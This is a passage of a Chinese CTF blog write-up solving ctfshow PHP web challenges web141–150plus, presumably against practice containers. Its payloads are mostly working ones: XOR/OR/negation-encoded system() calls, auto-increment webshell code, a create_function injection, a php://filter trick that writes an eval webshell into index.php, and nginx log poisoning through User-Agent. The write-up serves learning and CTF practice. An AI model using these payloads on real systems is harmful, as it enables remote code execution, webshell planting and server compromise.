class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;<span class="title function_ invoke__">ord</span>(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">                        <span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure>
+
+
+<p>python构造脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"><span class="comment"># import requests</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">action</span>(<span class="params">arg</span>):</span><br><span class="line"></span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;xor_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line"></span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;^\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your function:&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your command:&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure>
+
+<p>ls一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=0&amp;v2=0&amp;v3=-(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%14%01%03%00%06%0c%01%07%00%10%08%10&quot;|&quot;%60%60%60%20%60%60%60%60%2e%60%60%60&quot;)-</span><br></pre></td></tr></table></figure>
+<p><img src="/2025/03/24/web141-150plus/file-20250324121659229.png"></p>
+<p>tac一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=0&amp;v2=0&amp;v3=-(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%08%01%03%00%06%0c%01%07%00%0b%08%0b&quot;^&quot;%7c%60%60%20%60%60%60%60%2e%7b%60%7b&quot;)-</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/03/24/web141-150plus/file-20250324121805521.png"></p>
+<h4 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h4><p>无长度限制，可以有很多操作</p>
+<p><code>%24_%3D%5B%5D._%3B%24__%3D%24_%5B1%5D%3B%24_%3D%24_%5B0%5D%3B%24_%2B%2B%3B%24_1%3D%2B%2B%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D%24_1.%2B%2B%24_.%24__%3B%24_%3D_.%24_(71).%24_(69).%24_(84)%3B%24%24_%5B1%5D(%24%24_%5B2%5D)%3B%20</code></p>
+<p><code>$_=[].&#39;&#39;;$_=$_[&#39;&#39;==&#39;$&#39;];$_++;$_++;$_++;$_++;$__=$_;$_++;$_++;$___=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_=$___.$__.$_;$_=&#39;_&#39;.$_;$$_[_]($$_[__]);</code></p>
+<h3 id="web142"><a href="#web142" class="headerlink" title="web142"></a>web142</h3><p>开启容器</p>
+<p>代码审计</p>
+<p><img src="/2025/03/24/web141-150plus/file-20250324123159835.png"></p>
+<p>直接传入，防止sleep太长<br><code>/?v1=0</code></p>
+<p><img src="/2025/03/24/web141-150plus/file-20250324123609895.png"></p>
+<h3 id="web143"><a href="#web143" class="headerlink" title="web143"></a>web143</h3><p>开启容器</p>
+<p>代码审计</p>
+<p><img src="/2025/03/24/web141-150plus/file-20250324123725690.png"></p>
+<p>相对于web141多了更多条件<code>~</code>无法取反，<code>%</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#system(&#x27;cat f*&#x27;)</span><br><span class="line">v1=1&amp;v2=1&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%03%01%0b%00%06%00&quot;^&quot;%60%60%7f%20%60%2a&quot;)*</span><br></pre></td></tr></table></figure>
+
+<p>(“%08%02%08%08%05%0d”^”%7b%7b%7b%7c%60%60”)(“%08%01%03%00%06%00”^”%7c%60%60%20%60%2a”)</p>
+<p><img src="/2025/03/24/web141-150plus/file-20250324124630113.png"></p>
+<h3 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h3><p>开启容器</p>
+<p>代码审计</p>
+<p><img src="/2025/03/24/web141-150plus/file-20250324125203598.png"></p>
+<p><code>v3</code>的值必须是长度为1<br>对应传入v2即可</p>
+<p><img src="/2025/03/24/web141-150plus/file-20250324125644563.png"></p>
+<h3 id="web145"><a href="#web145" class="headerlink" title="web145"></a>web145</h3><p>开启容器</p>
+<p>代码审计</p>
+<p><img src="/2025/03/24/web141-150plus/file-20250324125731285.png"></p>
+<p>这次异或<code>^</code>又被过滤了，可以用或<code>|</code>和取反<code>~</code>。</p>
+<h4 id="用or"><a href="#用or" class="headerlink" title="用or"></a>用or</h4><p>注意把双引号改成单引号</p>
+<p><code>/?v1=0&amp;v2=0&amp;v3=|(&#39;%13%19%13%14%05%0d&#39;|&#39;%60%60%60%60%60%60&#39;)(&#39;%0c%13&#39;|&#39;%60%60&#39;)|</code></p>
+<p><img src="/2025/03/24/web141-150plus/file-20250324130529294.png"></p>
+<p><img src="/2025/03/24/web141-150plus/file-20250324131048559.png"></p>
+<p><code>/?v1=0&amp;v2=0&amp;v3=|(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%14%01%03%00%06%02&quot;|&quot;%60%60%60%20%60%28&quot;)|</code></p>
+<h4 id="用取反"><a href="#用取反" class="headerlink" title="用取反"></a>用取反</h4><p><code>/?v1=1&amp;v3=|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)|&amp;v2=1</code><br><img src="/2025/03/24/web141-150plus/file-20250324131148454.png"></p>
+<h3 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h3><p>开启容器</p>
+<p>代码审计</p>
+<p><img src="/2025/03/24/web141-150plus/file-20250324131315332.png"></p>
+<p>这里异或<code>^</code>被过滤</p>
+<p>取反<br><img src="/2025/03/24/web141-150plus/file-20250324131602737.png"></p>
+<p>或也是可以的</p>
+<h3 id="web147"><a href="#web147" class="headerlink" title="web147"></a>web147</h3><p>开启容器</p>
+<p>代码审计</p>
+<p><img src="/2025/03/24/web141-150plus/file-20250324131834257.png"></p>
+<p>匹配不是以字母开头的字符串 ，create_funciton的用法，需要在前面加一个字符绕过正则，达到命令执行<br>%5c()可以绕过正则<br>php里默认命名空间是\，所有原生函数和类都在这个命名空间中。 普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路 径； 而如果写\function_name()这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create_function(&#x27;$a&#x27;,&#x27;echo $a.&quot;123&quot;&#x27;)</span><br><span class="line">类似于</span><br><span class="line">function f($a) &#123;</span><br><span class="line">  echo $a.&quot;123&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET ?show=;&#125;;system(&#x27;cat f*&#x27;);/*</span><br><span class="line">POST ctf=%5ccreate_function</span><br></pre></td></tr></table></figure>
+<p>本地测试可以RCE<br><img src="/2025/03/24/web141-150plus/file-20250324133156075.png"><br><img src="/2025/03/24/web141-150plus/file-20250324132552172.png"></p>
+<h3 id="web148"><a href="#web148" class="headerlink" title="web148"></a>web148</h3><p>开启容器</p>
+<p>代码审计</p>
+<p><img src="/2025/03/24/web141-150plus/file-20250324133337037.png"></p>
+<p>只要执行函数get_ctfshow_fl0g()即可<br>异或没被绕过</p>
+<p><img src="/2025/03/24/web141-150plus/file-20250324133731948.png"></p>
+<p>或者也可以直接RCE</p>
+<h3 id="web149"><a href="#web149" class="headerlink" title="web149"></a>web149</h3><p>开启容器</p>
+<p>代码审计</p>
+<p><img src="/2025/03/24/web141-150plus/file-20250324133830934.png"></p>
+<p>这里写入文件只能用index.php</p>
+<p>但是可以写入文件，且也只是当前目录下保留index.php。<br>那么就直接用伪协议把木马写入到index.php就可以了。</p>
+<p><strong>get</strong>：<code>?ctf=php://filter/write=convert.base64-decode/resource=index.php</code><br><strong>post</strong>：<code>show=PD9waHAgQGV2YWwoJF9QT1NUWydqeiddKTs/Pg==</code></p>
+<p><code>show=&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</code></p>
+<p><img src="/2025/03/24/web141-150plus/file-20250324134147954.png"></p>
+<p>成功写入木马<br><img src="/2025/03/24/web141-150plus/file-20250324134246491.png"><img src="/2025/03/24/web141-150plus/file-20250324134307095.png"></p>
+<h3 id="web150"><a href="#web150" class="headerlink" title="web150"></a>web150</h3><p>开启容器</p>
+<p>代码审计</p>
+<p><img src="/2025/03/24/web141-150plus/file-20250324134345572.png"></p>
+<p>post的<code>ctf</code>只是限制了不能有冒号，别的并没有被过滤<code>include($ctf)</code>，可以进行日志包含。</p>
+<p>因为<code>$key</code>有过滤字符，所以我们可以通过<code>User-Agent</code>传递木马信息。</p>
+<p>然后通过extract变量覆盖，满足isVip是true的条件限制。</p>
+<p><strong>get</strong>：<code>?isVIP=true</code><br><strong>post</strong>：<code>ctf=/var/log/nginx/access.log&amp;1=system(&#39;tac f*&#39;);</code></p>
+<p><img src="/2025/03/24/web141-150plus/file-20250324135059429.png"><br>在user-agent注入木马</p>
+<p><img src="/2025/03/24/web141-150plus/file-20250324135042547.png"></p>
+<h3 id="web150plus"><a href="#web150plus" class="headerlink" title="web150plus"></a>web150plus</h3><p>开启容器</p>
+<p>代码审计</p>
+<p><strong>解答</strong>：php中变量名的点和空格会被转换成下划线。</p>
+<p><strong>payload</strong>：<code>?..CTFSHOW..=phpinfo</code></p>
+<p>直接看</p>
+<p><img src="/2025/03/24/web141-150plus/file-20250324135819160.png"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">categories</a></li>
+        
+          <li><a href="/tags/">tags</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/youngking-gfy">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#web141"><span class="toc-number">1.</span> <span class="toc-text">web141</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%96%E5%8F%8D"><span class="toc-number">1.1.</span> <span class="toc-text">取反</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%88%96"><span class="toc-number">1.2.</span> <span class="toc-text">或</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BC%82%E6%88%96"><span class="toc-number">1.3.</span> <span class="toc-text">异或</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%87%AA%E5%A2%9E"><span class="toc-number">1.4.</span> <span class="toc-text">自增</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web142"><span class="toc-number">2.</span> <span class="toc-text">web142</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web143"><span class="toc-number">3.</span> <span class="toc-text">web143</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web144"><span class="toc-number">4.</span> <span class="toc-text">web144</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web145"><span class="toc-number">5.</span> <span class="toc-text">web145</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8or"><span class="toc-number">5.1.</span> <span class="toc-text">用or</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%94%A8%E5%8F%96%E5%8F%8D"><span class="toc-number">5.2.</span> <span class="toc-text">用取反</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web146"><span class="toc-number">6.</span> <span class="toc-text">web146</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web147"><span class="toc-number">7.</span> <span class="toc-text">web147</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web148"><span class="toc-number">8.</span> <span class="toc-text">web148</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web149"><span class="toc-number">9.</span> <span class="toc-text">web149</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web150"><span class="toc-number">10.</span> <span class="toc-text">web150</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web150plus"><span class="toc-number">11.</span> <span class="toc-text">web150plus</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://youngking-gfy.github.io/2025/03/24/web141-150plus/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://youngking-gfy.github.io/2025/03/24/web141-150plus/&text=web141-150plus"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://youngking-gfy.github.io/2025/03/24/web141-150plus/&title=web141-150plus"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://youngking-gfy.github.io/2025/03/24/web141-150plus/&is_video=false&description=web141-150plus"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=web141-150plus&body=Check out this article: https://youngking-gfy.github.io/2025/03/24/web141-150plus/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://youngking-gfy.github.io/2025/03/24/web141-150plus/&title=web141-150plus"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://youngking-gfy.github.io/2025/03/24/web141-150plus/&title=web141-150plus"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://youngking-gfy.github.io/2025/03/24/web141-150plus/&title=web141-150plus"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://youngking-gfy.github.io/2025/03/24/web141-150plus/&title=web141-150plus"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://youngking-gfy.github.io/2025/03/24/web141-150plus/&name=web141-150plus&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://youngking-gfy.github.io/2025/03/24/web141-150plus/&t=web141-150plus"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Y0ungK1ng
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">categories</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/youngking-gfy">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
